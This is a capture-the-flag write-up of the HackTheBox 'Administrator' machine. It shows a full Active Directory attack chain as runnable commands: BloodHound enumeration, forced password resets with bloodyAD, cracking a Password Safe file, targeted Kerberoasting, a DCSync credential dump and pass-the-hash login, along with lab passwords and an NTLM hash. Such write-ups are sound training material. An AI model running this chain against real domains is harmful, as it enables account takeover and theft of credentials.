---
description: 'Username: Olivia Password: ichliebedich'
---

# 📦 Administrator

I start off by scanning for open ports:

<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

I quickly get a list of usernames:

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

And the groups on the domain:

<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

the creds that were given to us have winrm rights so let's connect then we launch bloodhound python:

```
bloodhound-python -u Olivia -p 'ichliebedich' -c All -d administrator.htb -ns 10.129.107.16
```

And start a bloodhound instance:

```
neo4j console
```

while launching our bloodhound collector we see a new host that we can add to hosts ->

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

and i launch bloodhound without root!!

I mark user olvia as owned and continue by looking at the node info of olivia and seeing she as First degree object control GenericAll over michael:

<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

and michael has ForceChangePassword over Benjamin:

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

Knowing this we can install bloodyAD and abuse those rights:

<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

```
bloodyAD -u "olivia" -p "ichliebedich" -d "Administrator.htb" --host "10.129.107.16" set password "Michael" "Password1"
bloodyAD -u "Michael" -p "Password1" -d "Administrator.htb" --host "10.129.107.16" set password "Benjamin" "Password1"
```

I'll have to test this tool later on:

{% embed url="https://github.com/CravateRouge/autobloody" %}

Now we can confirm we have succesfully changed the password:

<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

So i restart my enumeration process with these credentials and end up connecting to an FTP instance with the creds of Benjamin

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

After googling the extension, i found the tool pwsafe2john and used it to get a hash out of this file:

```
pwsafe2john Backup.psafe3 > backuphash.txt
john backuphash.txt
```

Which gave me password: `tekieromucho`

Then i started to look how to open the file:

{% embed url="https://installati.one/install-passwordsafe-kalilinux/#google_vignette" %}

Then i upload the file and see 3 users:

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

I'm able to see the passwords just like that:

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

I quickly see which one is the path to follow:

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

On bloodhound we see that emily has GenericWrite on Ethan:

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

I start iff looking at some attack vectors:

{% embed url="https://www.thehacker.recipes/assets/DACL%20abuse%20mindmap.CnS4bNaY.png" %}

I try GetUserSpns but it does not work, then i find a tool from shutdown that tries to Set an SPN and abuse it for us:

{% embed url="https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py" %}

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

i had the following problem: \[!] Kerberos SessionError: KRB\_AP\_ERR\_SKEW(Clock skew too great) that happens when the time difference between your **attacking machine** and the **Domain Controller (DC)** is too large (usually more than 5 minutes). so i had to sync my time with DC:

```
sudo ntpdate -u 10.129.107.16
python targetedKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "administrator.htb" --dc-ip 10.129.107.16
```

Then i put my hash in a file and crack it with john and end up with `limpbizkit`

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

We are at the last step of this box i thing and we have DCsync rights on Administrator.htb so let's have fun:

{% embed url="https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync#dcsync" %}

<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption><p>secretsdump.py -outputfile 'dcsync.txt' administrator.htb/ethan:limpbizkit@10.129.107.16</p></figcaption></figure>

I can now do passthehash to get a session:

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

```
evil-winrm -i 10.129.107.16 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```
